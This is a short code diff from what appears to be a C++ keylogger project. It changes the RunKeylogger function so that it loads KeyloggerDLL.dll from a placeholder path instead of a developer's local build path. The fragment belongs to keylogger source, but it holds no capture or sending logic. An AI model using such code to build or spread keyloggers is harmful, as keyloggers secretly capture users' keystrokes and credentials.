@@ -49,7 +49,7 @@ void StopKeylogger() {
 
 
 void RunKeylogger() {
-	hDll = LoadLibraryA("C:\\Users\\ISE\\source\\repos\\KeyloggerDll\\x64\\Debug\\KeyloggerDLL.dll");
+	hDll = LoadLibraryA("PATH_TO_KeyloggerDLL.dll");
 	if (!hDll) {
 		std::cerr << "Failed to load DLL." << std::endl;
 		return;
